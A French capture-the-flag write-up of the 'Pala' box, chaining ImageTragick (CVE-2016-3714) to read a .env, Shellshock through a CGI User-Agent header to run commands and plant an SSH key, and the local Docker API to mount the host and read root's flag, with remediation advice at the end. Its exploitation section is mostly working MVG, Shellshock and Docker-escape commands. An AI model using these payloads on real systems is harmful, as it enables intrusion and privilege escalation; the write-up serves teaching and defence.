# Pala — ImageTragick pour entrer, Shellshock et docker pour finir

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/pala/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Le service `pala-orders` convertit mes images avec un vieil
> ImageMagick 6.9.3 (ImageTragick, CVE-2016-3714). Un fichier MVG me donne la
> lecture de fichiers, donc le `.env` et ses identifiants. Je me connecte au
> portail, et son CGI tourne sur un bash 4.3 vulnérable à Shellshock : via le
> `User-Agent`, j'exécute du code en `lp`, qui se trouve dans le groupe `docker`.
> Je m'injecte une clé SSH, puis l'API Docker locale me monte l'hôte et me donne
> root. **Flag :** `/root/root.txt` → `NCTF{b00d…}`.

## 1. Briefing

Un boot2root de la finale, `10.100.13.102`. Tous les ports sont `filtered` au
scan : la seule chose qui répond, c'est l'API web en 80.

| Champ | Valeur |
|-------|--------|
| Cible | `10.100.13.102` |
| Service | `pala-orders`, `palaconvert 6.9-3` (ImageMagick 6.9.3-9) |
| Flag | `NCTF{...}` |

## 2. Reconnaissance

```bash
curl http://10.100.13.102/api/version
# {"converter":"palaconvert 6.9-3","engine":"ImageMagick 6.9.3-9 (legacy build)",
#  "service":"pala-orders","upload_max":"8M"}
```

ImageMagick 6.9.3-9, c'est exactement la fenêtre d'ImageTragick. Et le service
accepte des uploads base64 pour les convertir. Ça sent le MVG.

## 3. Analyse

ImageTragick (CVE-2016-3714) : les délégués d'ImageMagick exécutent des commandes
quand on les nourrit d'un fichier MVG/SVG forgé. Comme `palaconvert` me renvoie
le `stderr` et le `stdout` de la conversion, j'ai une exécution de commande avec
retour direct — parfait pour lire des fichiers.

## 4. Exploitation

### Étape 1 — ImageTragick : lire le .env

```bash
cat > /tmp/pala.mvg <<'EOF'
push graphic-context
fill 'url(https://pala.invalid/|cat /var/www/.env)'
pop graphic-context
EOF
B64=$(base64 -w0 /tmp/pala.mvg)
curl -s -X POST http://10.100.13.102/upload \
  -H 'Content-Type: application/json' \
  -d "{\"name\":\"catalogue.mvg\",\"data_b64\":\"$B64\"}"
```

La réponse me rend le `.env` dans `converter_stdout` :

```
PORTAL_USER=printop
PORTAL_PASS=Pr1nt0p!2026
WORKER=docker://127.0.0.1:2375
NOTE=le compte lp traite la file d'impression (CGI bash 4.3.0)
```

Deux cadeaux : des identifiants, et l'indice qu'un CGI tourne sur un bash 4.3.

### Étape 2 — Shellshock sur le CGI (→ lp, groupe docker)

```bash
curl -s -c pala.cookies -X POST http://10.100.13.102:8080/login \
  -d 'user=printop&password=Pr1nt0p!2026'

# bash 4.3 → Shellshock via le User-Agent
curl -s -b pala.cookies http://10.100.13.102:8080/cgi-bin/status.cgi \
  -A '() { :;}; id; getent passwd lp'
# uid=7(lp) gid=7(lp) groups=7(lp),1000(docker)
```

`lp` exécute mes commandes **et** il est dans le groupe `docker`. Jackpot.

### Étape 3 — m'injecter une clé SSH en lp

L'API Docker n'accepte `create`/`start` que depuis la boucle locale ; il me faut
donc un vrai shell `lp`. Je génère une clé et je la pousse dans
`~lp/.ssh/authorized_keys` via le même Shellshock :

```bash
ssh-keygen -t ed25519 -N '' -f ./pala_key -q
PUB=$(cat ./pala_key.pub)
curl -s -b pala.cookies http://10.100.13.102:8080/cgi-bin/status.cgi \
  -A "() { :;}; H=\$(getent passwd lp | cut -d: -f6); mkdir -p \$H/.ssh; \
      printf '%s\n' '$PUB' > \$H/.ssh/authorized_keys; \
      chmod 700 \$H/.ssh; chmod 600 \$H/.ssh/authorized_keys"
ssh -i ./pala_key lp@10.100.13.102
```

### Étape 4 — groupe docker → root

```bash
# depuis la session lp (API en 127.0.0.1:2375)
BODY='{"Image":"alpine","HostConfig":{"Binds":["/:/host"]},"Cmd":["cat","/host/root/root.txt"]}'
ID=$(curl -s -XPOST http://127.0.0.1:2375/containers/create \
       -H 'Content-Type: application/json' -d "$BODY" | sed -n 's/.*"Id":"\([a-f0-9]*\)".*/\1/p')
curl -s -XPOST http://127.0.0.1:2375/containers/$ID/start
curl -s http://127.0.0.1:2375/containers/$ID/logs?stdout=1
```

## 5. Flag

```text
NCTF{b00d…}
```

## 6. Impasses & leurres

- **Ports tous filtrés** : le scan ne montre rien d'exploitable à part l'API 80.
  Ne pas s'acharner sur `nmap`, lire l'API.
- **Docker à distance refusé** : `create`/`start` ne marchent que depuis la
  machine — d'où le détour par la clé SSH de `lp` plutôt que d'appeler
  l'API `2375` à travers Shellshock.

## 7. Leçons & remédiation

- **Mettre à jour ImageMagick** et appliquer une `policy.xml` qui désactive les
  délégués dangereux (`MVG`, `MSL`, `URL`, `EPHEMERAL`…). ImageTragick est connu
  depuis 2016.
- **Shellshock en 2026** : ne jamais exécuter un CGI sur un bash non patché, et
  surtout ne pas passer d'en-têtes HTTP dans l'environnement d'un shell.
- **Le groupe `docker` = root**, et l'API `2375` sans TLS est une porte ouverte.
  Retirer `lp` du groupe, exiger TLS mutuel.
- **Secrets hors de la racine web** : un `.env` lisible par le convertisseur, et
  c'est toute la chaîne qui tombe.
